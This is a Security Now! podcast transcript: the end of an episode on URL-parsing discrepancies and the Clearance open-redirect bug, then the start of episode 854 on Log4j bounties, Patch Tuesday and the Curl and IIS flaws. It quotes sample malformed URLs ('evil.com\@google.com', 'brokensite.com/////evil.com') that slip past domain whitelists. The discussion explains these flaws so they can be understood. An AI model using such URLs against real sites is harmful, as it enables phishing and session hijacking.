STEVE:  You can see two, yeah, top of page 13.



LEO:  That's this.



STEVE:  Really?  Oh, no, I'm sorry.  You're on their PDF.  I'm on my show notes.



LEO:  Oh, that's why.  There you go.



STEVE:  Sorry.



LEO:  Okay.  I'll find it.  Go ahead.



STEVE:  Yeah.  Anyway, they marked them in red, two backslashes in a row, which of course is an escape for a backslash, meaning I actually mean one backslash.  But it's grouped in there along with a forward slash as being a valid terminator for the authority, that is, for the domain name.  Okay.  So this means that if an authority contains a backslash, urllib3 would split it out at that point and use only what appears before the backslash as the authority, then concatenating what follows the backslash to the front of the URL's path.



Anyway, the bottom line is it's exactly what we were talking about, this problem that occurred in Log4j.  So, for example, and here's where our listeners need to visualize, if you had http://evil.com\@google.com/, if the latest RFC is obeyed, as most parsers do, which specifies that backslash has no special meaning inside a URL authority, the malformed evil.com URL would be parsed as evil.com\@.  Now, remember the old and now deprecated URL-embedded username and password syntax.  Remember, you used to actually be able to put a username and password in the URL?



LEO:  Another bad idea.



STEVE:  Oh, my god.  Really bad idea.



LEO:  Oh, my god.



STEVE:  Oh.  What were they thinking?



LEO:  Oh, geez.



STEVE:  Anyway, they first, you know, started saying we really don't think that's a good idea.  Then they have formally now said no, that's no longer going to be considered legal.  It should never be done.  But it's still tolerated because of old  URLs out there.



LEO:  Right, right.



STEVE:  So that means that everything in front of the @ sign is considered "userinfo," as it's termed.  So that means that something that doesn't treat backslash specially inside the authority, as the RFC says you shouldn't, will end up parsing that with evil.com\@ as userinfo, and so the actual domain will start and be seen as google.com.



Okay.  The researchers tested this and found that, yes indeed, this is what most of the RFC-compliant parsers do.



LEO:  So this is harmless because it's ignoring evil.com.



STEVE:  Correct.  They do not treat the aberrant backslash as the end of the authority.  Since it precedes the @ sign, they treat it as part of the userinfo.  But not urllib3, which is heavily used.  Urllib3, as we saw in that regular expression, it's right above - it's at the top of page 13, yeah, if you scroll up you'll see it, the second line in that chart, the two red backslashes, that's in there as the terminator for the authority, that is, it and a forward slash, either of those.  So they did it on purpose.



LEO:  Oh, wow.



STEVE:  Yup.



LEO:  You could see how easy this would be, though, if you look at this regular expression, to make a mistake.



STEVE:  Yeah.  I mean, yeah.  And so, okay, it's in there.  Its result will not be the same.  And here it is, Leo.  Since the "requests" Python module, that's where that earlier snippet of code came from, a heavily used Python module "requests" uses urllib3 as its primary parser while still using urllib's urlparse...



LEO:  Don't mix them.



STEVE:  ...and urlsplit for other purposes, yes, it mixes them.  So we could easily run afoul of the differential parsing scenario we described earlier.  And as I said, I thought when I first saw it, it was a synthetic example.  No.  It's right out of the Python code, where it comes up with different answers.



Okay.  So we've established that a collection of five what we might call "exploitation primitives" exists.  It should be clear that when parsing the same data, all URL parsers should be deterministic and should return identical results.  When that is not done, the parsers introduce a dangerous uncertainty into the process to create a wide range of potentially exploitable vulnerabilities.



They gave us a bunch.  I'll just describe one.  It's a very popular product or package called Clearance for Ruby.  As a direct consequence of these parsing mistakes, the researchers discovered a dangerous and exploitable Open Redirect vulnerability in the Ruby gem package known as Clearance, and it was assigned a CVE of 23435.  Actually 2021-23435.  Open redirect vulnerabilities enable powerful phishing and man-in-the-middle attacks by secretly redirecting a user's browser to fraudulent sites.  The vulnerabilities occur when a web application accepts a user-controlled input that specifies a URL that the user will be redirected to after a certain action such as a successful login or logout occurs.



In order to protect users from an open redirect attack, web servers carefully validate the given URL and allow only URLs that belong to the same site or to a list of trusted redirection targets to be used.  So you can probably see where this is going.  Right?  If you can't trust the thing that's parsing your verification, we just saw where a whitelist could be broken, then you're in trouble.



To make a long story short, what this thing allows is a bad guy to use these parsing vulnerabilities that are present in the Clearance Ruby gem package to perform successful man-in-the-middle attacks to hijack people's sessions and bring them back after logging into the bad site, even though the victim site where the user logged in has explicit code to prevent that from happening because the danger is well understood.  So this just ends up being a huge problem.



In the case of this Clearance package, as I said, it will redirect a user to a logged-on page.  In the show notes at the top of page 16 I show their example, which is www dot - actually it's my example - brokensite.com/////evil.com.  When that ends up getting parsed by the broken parser which the Clearance package is using, it ends up giving the browser ///evil.com.



So what's a bit surprising is that if the user were using Chrome, Chrome would receive the URL ///evil.com, which hardly seems valid and which we might expect Chrome to balk at.  But web browsers, as we were getting to talking about, have evolved to be hyper lenient with what they will accept.  After all, users are entering cryptic-looking URLs and aren't perfect.  So Chrome's lenient behavior is they consider it a feature, not a bug.



And in fact in the Chromium source, in a big comment block, it says:  "The syntax rules of the two slashes that precede the host in a URL are surprisingly complex.  They are not required, even if a scheme is included [and then they say] (http:example.com) [no slashes] is treated as valid," which I never knew.  I'm not going to bother putting slashes anymore.  Chrome ignores them.  And it says:  "...and are valid even if a scheme is not included."  Then they say:  "(//example.com is treated as file:///example.com)."  He says:  "They can even be backslashes."  What?  Yes, "(http:\\example.com and http [no colon] http\/example.com" - this is Chrome's own notes, this is in a comment block - "are both valid) and there can be any number of them" - it actually says that - "(http:/example.com and http://////example.com are all valid)."



LEO:  And this is because users are going to type that.  And so we just want to...



STEVE:  Yes.  Yeah, exactly.



LEO:  And you can't really blame them for the Log4j problem.



STEVE:  No.



LEO:  No.  That's Log4j's problem in parsing its input. 



STEVE:  Correct.  Correct.



LEO:  Because Chrome's a browser, and it's just trying to do what it thinks you want.



STEVE:  Yes.  Exactly.  It's going to try to make sense of what gibberish you have just typed into the URL and go, okay, let's guess here where they want to go.



LEO:  Yeah.



STEVE:  So suffice to say that with all this, we have another example of longstanding, deeply embedded, critically broken code which despite now being identified, will remain in use until all references to it are eventually, if ever, weeded out.



We also have another example, which I did appreciate the fact that the researchers were able to see what was going on, of the power of open source software.  The researchers were able to peer into the code to see and understand how it operated and what it does.  The fact they didn't like what they found, well, they can fix it, or find the guy who can fix it.  The flipside, of course, is that malicious actors have access also.



But overall, "open" seems clearly better, since when well-meaning researchers are able to offer feedback to make bad code better, that happens; whereas bad guys need to operate with whatever they can find, unless they worm their way into being trusted on a project.  That's the one case.  Otherwise they don't have the ability to make good code bad in the same way that researchers can help to make bad code good.  So thus the argument for letting lots of people look at it, and it's just going to kind of float to the surface and be good all on its own.  But anyway, URL parsing vulnerabilities exist, and they're all around.



LEO:  It's amazing.  Just amazing.



STEVE:  Yeah.



LEO:  Wow.  This is the root cause of the Log4j problem is just this inability to recognize malformed URLs.



STEVE:  No, actually, this intersected log - the root cause of Log4j is that you insanely processed a URL in a log output.  It's like, what?



LEO:  You're right, that's a mistake by itself, yeah, yeah.



STEVE:  And so what happened was the first fix was to do a whitelist on the domain.



LEO:  And then that didn't work, yeah, because of this problem.



STEVE:  And that didn't work because of the parsing, the URL parsing vulnerability.



LEO:  Wow, wow.  I bet it's turtles all the way down.  I mean,  bet, honestly, you solve that, and then you're going to find another one, another one, another one, another one.



STEVE:  Yup.  Yup.  As we've said, security is porous.  The harder you look, the more you find.



LEO:  Yeah.  That's amazing.  What an interesting topic.  I hope everybody subscribes to this show so they can hear this.  Obviously you're listening.  Thank you.  GRC.com is the place to go for Steve's website.  That's where SpinRite, the world's best mass storage recovery and maintenance utility, lives.  6.0 is the current version; 6.1 is imminent.  If you buy 6.0 now, you'll get 6.1 for free.  You can also participate in the development of 6.1.



Steve also has this show there, the 16Kb audio version as well as the 64Kb audio.  He's got the show notes, as we mentioned.  He also has transcripts.  A couple of days after the show we'll have transcripts written by an actual human, so you can actually follow along or search for the topic you're interested in, et cetera, et cetera.  This is a show I think people will share with one another just because just that last part alone is really, really interesting. 



We have 64Kb audio and video at our site, TWiT.tv/sn.  You can always download any show there.  There are 853 to choose from.  This is the 853rd.  There's a YouTube channel with all the shows, dedicated to Security Now!.  And of course subscribing is probably the best thing to do, get it automatically the minute it's available.  And if your podcast player supports reviews, please tell the world how great Security Now! is.  Leave us a five-star review so everybody can discover this show because they don't want to miss this.  This is good stuff, Steve.



If you want to watch us do it live, it's a little tricky because MacBreak Weekly is an accordion and can expand or contract completely at random.  But nominally we do this show at 1:30 p.m. Pacific, 4:30 Eastern of a Tuesday afternoon.  That's 21:30 UTC.  And the livestreams, audio and video, are at live.twit.tv.



My suggestion is just have it on all day Tuesday.  Start in the morning at 9:00 a.m. Pacific with iOS Today, then MacBreak Weekly at 11:00, Security Now! whenever we get around to it, and All About Android after this.  So, you know, it's a big - Tuesday's our biggest day, I think.  Lots of good content, all day long.  So just have TWiT on live all the time.  That's my advice to you.  All right, Steve.  I'm off to read "The Expanse."



STEVE:  And to recharge your SodaStream cartridges.



LEO:  Oh, yeah, yeah.  I've got some questions about that.  We'll talk about that off the air.  Thank you, Steve.  Have a great week.



STEVE:  Okay, buddy.  Ciao.



Copyright (c) 2022 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.










GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#854

DATE:		January 18, 2022

TITLE:		Anatomy of a Log4j Exploit

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-854.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we start off by looking at how the U.S. Pentagon is dealing with Log4j and how the U.S. administration at the White House wants to improve the security of open source software.  This being the third Tuesday of the month, we'll look back at last week's decidedly mixed-blessing Patch Tuesday, the good and the unfortunate.  We'll check out a very serious new remotely exploitable problem which affects many popular routers, and provide a shortcut of the week to immediately check your own routers.  We'll cover a new and very welcome access control standard being introduced by the W3C which Chrome is already in the process of adopting.



We'll wrap up the top portion of the podcast with yet another set of very serious WordPress add-on blunders.  We'll share a bit of listener feedback, including answering the very popular questions about refilling empty SodaStream tanks.  And after a brief SpinRite progress update we're going to take a close look inside the operation of an actual Iranian Log4j exploit kit.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Lots to talk about, one week into the January Patch Tuesday update.  Steve says it's decidedly a mixed blessing.  There's a new router exploit that's going to get you to want to reboot your router, and then a step-by-step examination of a real-world zero-day Log4j exploit.  It's all coming up next on Security Now!.	



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 854, recorded Tuesday, January 18th, 2022:  Anatomy of a Log4j Exploit.



It's time for Security Now!, the show where we cover your safety, security, privacy online with the man in charge, Steve Gibson.  Hello, Steve.



STEVE GIBSON:  For the 854th time.



LEO:  Wow.



STEVE:  Yo, we're getting the hang of this, Leo.  It's like, okay, just increment the counter, add seven to the day of the month unless it wraps, and off we go.



LEO:  In fact, I can almost always go, oh, there'll be Microsoft Patch Tuesday exploits.



STEVE:  That's right.



LEO:  There'll be something wrong here, some ransomware there.  It writes itself, Steve.



STEVE:  You're right.  What am I doing here?  I can sure...



LEO:  No, no, no, please, you don't get out of this.  No way.



STEVE:  So we're going to start off by looking at how, well, I should say this is Episode 854 for the 18th of January, "The Anatomy of a Log4j Exploit."  We're going to start off by looking at how the U.S. Pentagon is dealing with Log4j, and how the U.S. administration at the White House wants to improve the security of open source software.  This being, as you said, Leo, the third Tuesday of the month, we'll be looking back at last week's once again unfortunately decidedly mixed blessing Patch Tuesday, the good and the bad.  We'll then look at a very serious new remotely exploitable problem which affects millions of popular routers, and provide a shortcut of the week to immediately check everyone's own router to see whether they might be vulnerable to this.  And if so, just unplug. 



LEO:  Oh, man.



STEVE:  Oh, it's bad.  And then cover a new and very welcome access control standard being introduced by the W3C which Chrome is already in the process of adopting.  We'll talk about that.  This is really a nice piece of technology.  We'll wrap up the top portion of the podcast with yet another set of very serious WordPress add-on blunders.  I think it was 84,000 sites affected now?  



LEO:  Yikes.  Yikes.



STEVE:  It's like, oh, goodness.  We're going to share a little bit of listener feedback, including answering the very popular questions about how to refill empty SodaStream tanks.



LEO:  Turns out the topic of the week last week.



STEVE:  It was.  You and I just briefly mentioned it in passing.  I got swamped in Twitter.  It's like, what?  You can do that?  How do you do that?  So we'll talk about that.  And then after a brief SpinRite progress update, we'll take a look at the inside of the operation of an actual Iranian Log4j exploit kit.



LEO:  Oh, wow.  Oh, wow.



STEVE:  So, yeah, I think a fun podcast for our listeners.



LEO:  All right-y.



STEVE:  And of course an engaging Picture of the Week.



LEO:  Yes, I love it.  You know, this is the geekiest show we do.  I just love the level of, well, you'll see when you see the Picture of the Week.  I just love it.  I just love it.  All right.  I have a Picture of the Week that made me laugh out loud.  I love this.



STEVE:  So, yes, for those who are not looking at the screen or the show notes, this begins with the inspiration from the flag of Norway, which is set against a red field.  And basically it has what looks like, well, when you see it, sort of like two wires crossing perpendicularly.  And they're insulated by some whiteness.  Anyway, somebody realized, well, we could do some other flags.  For example, you could have, instead of Norway, you could have ANDWAY, where those who are familiar with logic diagrams would replace the crossed wires with an AND gate.  Of course then that would lead to NANDWAY, XORWAY, XNORWAY if you invert the output of the XORWAY, and of course NOTWAY.  And having looked at those, I realized, well, it's really too bad that we began with NORWAY as the...



LEO:  Right?



STEVE:  Because, I mean, it's an OR gate.  So, yeah.  But no.  That was the inspiration, so we're leaving that one alone.



LEO:  And by the way, that AND gate is the inspiration for the TWiT logo.



STEVE:  Ah, the TWiT logo, yes.



LEO:  Yeah, yeah.



STEVE:  That's very cool.



LEO:  There you go.  All right.  



STEVE:  Okay.  So Hack the Pentagon with Log4j.  At the end of last year, 2021, the Pentagon pivoted its ongoing Hack the Pentagon bug bounty program, which we've talked about years ago, I think it was 2016 that they launched it.  And that's something that's being managed through HackerOne, through the HackerOne program, as opposed to trying to do it in-house, which I think was a good idea.  They pivoted, not surprisingly, to track down Log4j vulnerabilities on what amounted to potentially thousands of public-facing military websites. 



This was the first time that the U.S. Department of Defense had marshaled the ethical hacker community to tackle an emerging digital crisis in essentially real time.  So normally it's just sort of like, oh, well, if you find something, and you're prequalified, remember that they - I think they have 50, something like 50 vetted cybersecurity researchers.  They're not saying anybody anywhere come hack us.  That'll probably get you in trouble.  You need to be preapproved.



So just after days from the time that the public was made aware of the Log4j problem, the branch of the DoD known as the Defense Digital Service, or DDS, in connection with HackerOne, who as I said manages the department's bug bounty program, had broadened the scope of the ongoing competition for testing their own systems and software.  Katie Olson, the director of the DDS, told The Record that:  "It was a really quick effort, and a really elegant solution, to use a contract that we already had in place with the crowdsource research community to very quickly do a scan of what might be affected within the DoD."



Okay.  So as a result, the roughly 50, as I said, previously vetted cybersecurity researchers who were already participating in the existing hunt were given the additional assignment to scour all .mil websites and report any potential weaknesses or exploits caused by the Log4j vulnerability.  This on-the-fly change, that is, in their targeting, coincided with the decision we talked about last week by the U.S. Department of Homeland Security, whose own bug bounty program was just in the process of being launched, to similarly broaden the scope of its own bug search.



Major tech companies and federal officials also have scrambled to grasp the full extent of the Log4j flaw, warning that potentially, as we know, hundreds of millions of devices around the globe could be compromised.  CISA last month issued an emergency directive requiring all civilian federal agencies to mitigate the threat.  As I've often joked, no Christmas until you do, even though Christmas did happen on schedule, though top agency officials on Monday, last Monday, repeated that they have not seen a malicious actor use the vulnerability to breach federal departments and agencies.  At the same time, there's the expectation that, if that had been done, it would be definitely kept on the down-low.



During a conference call with tech reporters, Eric Goldstein, who is CISA's executive assistant director for cybersecurity, stated that the effort had already, that is, the government's effort, had uncovered 17 previously unidentified assets that were vulnerable to Log4j, all, Eric said, which were remediated before any intrusion could occur.  He added that:  "It demonstrated the extraordinary power crowdsourcing brings to the research community to help not only the U.S. government but the broader nation to find vulnerabilities before adversaries can abuse them."



So anyway, although the Pentagon was already using an ecosystem of passive scanning software and technology to continuously monitor its assets, as we know, Log4j differs from previous cyber incidents by not centering around specific types of hardware or software, like VPNs or firewalls.  The trouble was, at the time of its initial disclosure, there was no mature automated solution available to track down, locate and verify exploitable vulnerabilities.  A guy named Lance Cleghorn, who's a digital services expert at the DDS, told The Record:  "That's where the crowd really comes in to save the day.  They can not only tell you, 'Hey, I actually went and found this, and it's vulnerable for sure,' they're able to also say, 'Here's the evidence.'  And 'It's exploitable, and that's a problem.'"



So at first blush public-facing military websites may not seem like an attractive target for hackers.  Again, you do risk bringing down the wrath of the U. S. government and the DoD.  However, there's long been a concern within the DoD that a sophisticated threat actor could use a previously unknown vulnerability to penetrate its network - yeah, like anybody on the 'Net should be worried - and to gain a foothold in the department systems.  And there is that massive Nonclassified Internet Protocol Router Network known as NIPRnet, literally stands for Nonclassified Internet Protocol Router Network. 



HackerOne's CISO, and who also calls himself the Chief Hacking Officer, Chris Evans said that once the bug bounties were expanded to explicitly include Log4j, hackers "responded immediately and competently, with numerous valid reports pouring in within the first few hours of that explicit expansion."  The DDS paid competitors $500 per discovered vulnerability and an additional $500 if proof of exploitability was also provided.  And I don't know, Leo, you know, given the amount of money that the U.S. has, every time I look at those numbers that...



LEO:  Seems so cheap; doesn't it?



STEVE:  It does.  It's like, if you're serious about getting these problems rooted out, you know, a couple grand at least; you know?  Really.



LEO:  I agree.



STEVE:  Wow.  However, neither Katie Olson nor Lance Cleghorn, both at the DDS, were willing to disclose how many vulnerabilities had been found during the retooled bug bounty.  Lance did say:  "We've paid out a chunk."  Okay.



LEO:  A whole $700.



STEVE:  Exactly.



LEO:  A lot of money.



STEVE:  Exactly.  And Katie hopes that even more U.S. government agencies will move to establish their own bug bounty programs.  You know, it does require some focus.  But one would hope that they already have - they've already got to have IT; right?  And they've got to have security people.  If they don't, they've got bigger problems.  So how tough can it be to establish a relationship with HackerOne and just, you know, copy what the DHS and the DoD have done.  It's been done; right?  There's already agreements and contracts in place.  Just change the heading on the top of the page and then get the other agencies going.  I can't understand why they wouldn't have done that already.



Speaking of the U.S. government, and specifically the White House, last Thursday the 13th, the Biden administration convened what they called the Open Source Software Security Summit, having the stated goal of getting public and private sector organizations to rally their efforts and resources with the aim of securing open source software and its supply chain.  Okay.  Good goal.  Although not only about Log4j, Log4j was the clear catalyst behind the summit.



In the public sector, the list of participants pretty much was the Who's Who, including the Deputy National Security Advisor for Cyber and Emerging Technology, that's a department, that was  Anne Neuberger; National Cyber Director Chris Inglis; officials from the Office of the National Cyber Director; Office of Science and Technology Policy; the Department of Defense; the Department of Commerce; the Department of Energy; the Department of Homeland Security; the Cybersecurity and Infrastructure Security Agency, of course, the CISA; the NIST; and the NSF.  The private sector was well represented by Akamai; Amazon; Apache; Apple; Cloudflare; Facebook/Meta; GitHub; Google; IBM; the Linux Foundation; the Open Source Security Foundation - the Open Source Security Foundation, I didn't know there was one, good; Microsoft; Oracle; Red Hat; and VMware.



The participants focused their attention onto three topics:  First, preventing security defects and vulnerabilities in open source software.  Yes, good, let's do that.  Improving the process for finding security flaws and fixing them.  And, third,  shrinking the time needed to deliver and deploy fixes.  All worthy goals.



The White House's after action report wrote:  "Most major software packages include open source software, including software used by the national security community.  Open source software brings unique value and has unique security challenges because of its breadth of use and the number of volunteers responsible for its ongoing security maintenance."  So this sounds a little bit like what the FTC, we talked about last week, what they said, you know, they did appreciate the particular challenges it represented because it was not commercial.  It was all free and just done by random people.



During the summit Google proposed the creation of a new organization that would act as a marketplace for open source maintenance that would match volunteers from participating companies with critical projects that need the most support.  Kent Walker, Google's President of Global Affairs and Chief Legal Officer both for Google and Alphabet, he was quoted saying:  "For too long, the software community has taken comfort in the assumption that open source software is generally secure due to its transparency and the assumption that many eyes were watching to detect and resolve problems.  But in fact, while some projects do have many eyes on them, others have few or none at all.  Growing reliance on open software means that it's time for industry and government to come together to establish baseline standards for security, maintenance, provenance, and testing."



LEO:  Just support it with money, for Christ's sake, at least.



STEVE:  Exactly.



LEO:  You know, that's the problem.  They use this stuff for free, and then they go, well, you see....  Support it.



STEVE:  Yeah, it's broken.



LEO:  It's broken.  Support it.



STEVE:  "...to ensure national infrastructure," he said, "and other important systems can rely on open source projects."



LEO:  At least he's not saying only use proprietary.



STEVE:  No.



LEO:  But it is Google, after all.



STEVE:  Right, yes.  "These standards should be developed through a collaborative process, with an emphasis on frequent updates, continuous testing, and verified integrity."  Yes.  Wouldn't that be nice.  If only, as you said, Leo, we had the money.  So, yeah, this is nice to see.  But for me, at least, I have no idea how we would get from where we are today to there.



The end of the White House's report suggested that the government's purchasing power could be, and would be [yawn], used to bring about that change.  What was written said:  "President Biden has made software security a national priority."  Okay.  I'm going to just bite my tongue.  "His Executive Order on Cybersecurity requires that only companies that use secure software development lifecycle practices and meet specific federal security guidance will be able to sell to the federal government for the first time," okay...



LEO:  Wow.



STEVE:  "...leveraging the purchasing power of the Federal government to drive improvements in the software supply chain, improvements that companies and governments around the world will benefit from."  So if we had not been paying attention to the way things never seem to get done in Washington, that buying power statement might be encouraging.  But it's just more bureaucracy.  We know that our present system is far from perfect.  It's a constant and necessary theme of this podcast.  But efforts like Google's Project Zero, Trend Micro's Zero-Day Initiative, HackerOne's bug bounty management, the Pwn2Own competitions, the annual Black Hat and Defcon conferences, everyone contributing to Chromium, the academic research, and the occasional crowdsourced funding of intensive security audits of mission critical packages, these are all existing, proven, and highly effective solutions within their own realms which have all emerged organically.  They have thrived year after year because they have been effective, and they've made sense.



If the U.S. government wants to help, its time would be better spent, I think, exactly as you said, Leo, in peeling off some taxpayer money.  And not too much.



LEO:  No, it wouldn't take much.



STEVE:  Since you don't want to wreck the status quo, you know, you don't want to wreck all this by just throwing money at it and having it all go sideways.  And put some additional funding behind these existing initiatives that are limited in what they can do due to lack of support for personnel or the size of bug bounty motivations.



Back in 1965, the U.S. Congress created an independent agency known as the National Endowment for the Arts.  It offers support and funding for projects exhibiting artistic excellence.  Artists write proposals and apply for grants to receive funding.  I'm all for change and for improving what we're doing.  But we're also largely doing the right things now.  Doing more of what we're already doing seems like a nearer term solution that could be implemented today with a greater guarantee of results. A National Endowment for the Improvement of Software Quality, if properly administered, might be a worthy consideration.



LEO:  Good.



STEVE:  So, yeah.  Maybe.  Think about it.



LEO:  Maybe, yeah, yeah.  There's just so many open source projects that end up as part of commercial software, but nobody's paying for them.  They're maintained by one guy's volunteer.  



STEVE:  Yup.



LEO:  And, you know, that's kind of Log4j's story.  And but they're used as infrastructure.  These companies need to kind of pony up and support this, I think.



STEVE:  Yeah, yeah.  That fabulous picture of the - it's not a house of cards.  It's like a tower of crazy blocks with, you know, down at the very bottom one little toothpick-size thing that's like holding up the whole crazy mess and maintained thanklessly by some guy in Nebraska.  You know, it's like, okay.



Okay.  Speaking of software quality, last Tuesday was another of Microsoft's all-too-frequent mixed-blessing Patch Tuesdays.  Okay.  So first, here's the good news:  A total of 97 vulnerabilities of varying severity were patched.  And there were also an additional 29 vulnerabilities fixed in Microsoft's Edge browser.  Of the 97 non-Edge vulnerabilities, nine were classified as Critical and the other 88 as Important.  Overall, the patches cover Windows and Windows components, Edge, Exchange Server - no surprise there - Office and Office's components, SharePoint Server, .NET Framework, Microsoft Dynamics, some open source software even, Hyper-V, Defender, and the Remote Desktop Protocol (RDP).



Dustin Childs with Trend Micro's Zero Day Initiative said:  "This is an unusually large update for January.  Over the last few years, the average number of patches released in January is about half this volume.  We'll see if this volume continues throughout the year.  It's certainly a change from the smaller releases that ended 2021."  Okay.  So Microsoft patched 67 bugs last month in December.  Now we're at 97.  Okay.



Now, Microsoft classes a zero-day vulnerability differently than we do here.  My feeling is that we need to reserve the term "zero-day," which has unfortunately taken hold as click bait, for a vulnerability which is first discovered when it is observed being used in the wild.  The point is that patching that puppy which is currently being exploited is much more important than patching a problem that's only potentially exploitable and which has been reported responsibly and privately.  So nobody knows about it except the group that can fix it.  But Microsoft also classifies vulnerabilities that have been irresponsibly and publicly disclosed as zero-days.  And also regardless of how bad they are.  So like, you know, somebody discloses a vulnerability that has the pizza come out cold.  Oh, that's a zero-day.  Oh, okay.



LEO:  That's a CVE of 10, baby.  That's critical, man.  Don't mess with that.



STEVE:  You know, but, okay, so that's what Microsoft wants to call them.  I can see their point, since the race is then on to get the world patched before the publicly disclosed vulnerability can be weaponized and actively deployed.  So I accept their definition in this case.  And that also means that a total of six unexploited, but published,, zero-day vulnerabilities as they want to call them, were also fixed last week.  So overall, the breakdown by type was 41 elevation of privilege vulnerabilities, and we know those are bad once you gain a foothold; 29 remote code execution vulnerabilities, obviously never good; nine security feature bypass vulnerabilities; which could be anything; nine denial of service vulnerabilities, which mostly means it's easy to crash something; six information disclosure vulnerabilities, something leaks; and three spoofing vulnerabilities.  Okay.



And separately, those six unexploited but published zero-days, as they call them, which were patched, were - and remember there was a mention of open source.  There was the open source Curl remote code execution vulnerability.  We'll look at that in a minute.  It's not clear to me how that executes remote code.  It's interestingly funky.  But anyway, there's also a Libarchive remote code execution vulnerability, definitely looks like you could execute code with that one.  Both of those are the two open source ones.  Then we have Windows User Profile Service elevation of privilege; Windows certificate spoofing; Windows event tracing Discretionary Access Control List (DACL) denial of service, so that crashes something; and Windows Security Center API remote code execution.



Okay.  Those first two, as I said, Curl and Libarchive, which are the only remote code execution problems among those six, had already been fixed by their maintainers, but the fixes had not yet been incorporated into Windows until last Tuesday.  So last Tuesday's Patch Tuesday updated Windows' use of those, Windows' inclusion of those.



Now, reading the details of the Curl problem, it's unclear, as I said, how it could offer remote code execution.  Here's what they said:  When Curl version >= 7.20.0 and <= to the one that fixed it, 7.78.0, connects to an IMAP or POP - so this is Curl connecting to an IMAP or POP3 email server to retrieve data using STARTTLS to upgrade the connection's TLS security, the server can respond and send back multiple responses at once that Curl caches.  Curl would then upgrade to TLS, but not flush the in-queue of cached responses, instead continue using and trusting the responses it got before the TLS handshake as if they were authenticated.  Using this flaw, it allows a man-in-the-middle attacker to first inject the fake responses, then pass-through the TLS traffic from the legitimate server and trick Curl into sending back data to the user under the assumption that the attacker's injected data comes from the TLS-protected server.



Okay.  So that's a cool hack; right?  Somebody figured out that Curl is going to want to elevate its security to TLS, assuming that the IMAP or POP3 server in the hello handshake indicated that it supports STARTTLS, and so that would happen.  So this is a very subtle and clever bug that comes about as a side effect of the STARTTLS kludge, which is really what it was.  It was the original way of providing email encryption over the traditional SMTP, IMAP, and POP ports before they obtained their own dedicated TLS connection ports which they have now.  And it's exactly the sort of bug that tends to creep into systems that were being pushed to do things they were not originally designed to do, such as on-the-fly switching an unencrypted connection to using encryption.



Okay.  So that's the Curl bug.  And as I said, someone claimed that it could be used for remote code execution, though didn't explain in this disclosure how that could be so.  Just looked like you could get a bad guy, a man in the middle could sneak some stuff into an email client query that didn't actually come from the then authenticated server.  But the Libarchive bug, affecting versions 3.4.1 through 3.5.1, is a use-after-free flaw in its "copy_string" function when called from either "do_uncompress_block" or "process_block."  So that one might well be leveraged for remote code execution if a bad guy found some way to get the user or the system to use Libarchive to decompress a specially and maliciously formed archive.  That one I believe. 



In any event, patching should not be postponed since many of these already do have proof-of-concept exploits published.  Remember they're Microsoft zero-days.  And as we often observe, attacks never get worse, they only ever get better.  Mostly though, compared to other things going on right now, this is certainly not a four-alarm fire.  So not for that reason.  Oh, and if you encountered some of last week's breathless "Oh my god, patch now, Windows contains a wormable flaw" press coverage, the reason I didn't lead with it is that for Windows IIS server to be vulnerable to it, which is what that breathless press coverage was about, requires enabling an obscure and non-default registry key.  Under CurrentControlSet\Services\HTTP\Parameters, someone needs to have enabled something called EnableTrailerSupport and set that to one.



We're all familiar with the way HTTP headers work, where they form metadata such as cookie information, an asset's creation timestamp, probably its lifetime before expiration, like how long that the client is allowed to cache it before explicitly checking to see if it's been updated and so on.  Well, it turns out that it's also possible - who knew? - for additional headers, in this case called "Trailers," to be included after a chunked-style encoded query or response.  Just a few weeks ago we clearly covered chunk-styled encoding because that came up in something we were talking about.



Okay.  So you can have headers after the content.  Okay, what?  This really feels like the HTTP designers ran out of important work to do and sat around asking themselves, "What else can we add?"  And that never ends well.  So they invented a previously unappreciated need, suggesting that it might be that a client or a server would not be able to fully form its query or response headers until after the body of the query or the response had been formed.  No one knows why that might be true; but, hey, it could happen.  Remember that since the dawn of the web this had never actually apparently been a problem.  But perhaps they got their important work finished early, so they decided to define a solution for this one, anyway.



So, yes, it turns out since HTTP/1.1, in addition to Headers, it's also possible to have Trailers.  But as I said, Windows' IIS server does not have that feature turned on by default.  And since no one actually uses Trailers, it's unclear why anyone would have ever turned it on.  But okay, until last Tuesday, if someone had actually turned it on, then yes, IIS could theoretically be exploited by leveraging some mishandling in its non-default enabled support for HTTP's unused and unnecessary Trailers feature.



Now, as for that flaw being wormable, it seems to me that requires somewhere for the worm to go.  And if no one else running IIS has that unused and unneeded and disabled feature enabled, that's going to be one lonely wannabe worm desperately trying to propagate.  Which kind of reminds me of my adolescence.



LEO:  Not reproduce, propagate.



STEVE:  Despite all of this, since we all agree that worms are bad, and since the attack complexity is quite low, this non-threat earned itself a CVSS of 9.8.  So that alone must be what the other tech press saw and thought, "Oh my god, 9.8."



LEO:  The pizza's going to be cold.  It's going to be so cold.



STEVE:  It is going to be a very cold pizza.  Now, actually, I've been told cold pizza can be quite tasty.



LEO:  It is.  It's an excellent breakfast treat.



STEVE:  Maybe that wasn't the best example to use.  In any event, what was never a huge problem is no longer any problem.  Well, it might be.  That was Patch Tuesday's good news.  Here's the other shoe.



As Threatpost headlined their coverage, "Microsoft Yanks Buggy Windows Server Updates."  So maybe there's hope for that worm after all.  Threatpost wrote:  "Since their release on Patch Tuesday, the updates have been breaking Windows, causing spontaneous boot loops on Windows domain controller servers, breaking Hyper-V, and making the ReFS volume systems unavailable."  Whoa.  "Microsoft has yanked the Windows Server updates it issued on Patch Tuesday after admins found that the updates had critical bugs that broke those three things."



People who were quite frustrated were venting all over Twitter.  I saw one posting asking the question, "Does Microsoft even test these things before releasing them?"  There was actually a great deal of frustration.  I heard about this directly from many of our listeners and Twitter followers.  In addition, it's been confirmed that Tuesday's updates for Windows 10 desktop machines were also breaking L2TP VPN connections.  They no longer worked.



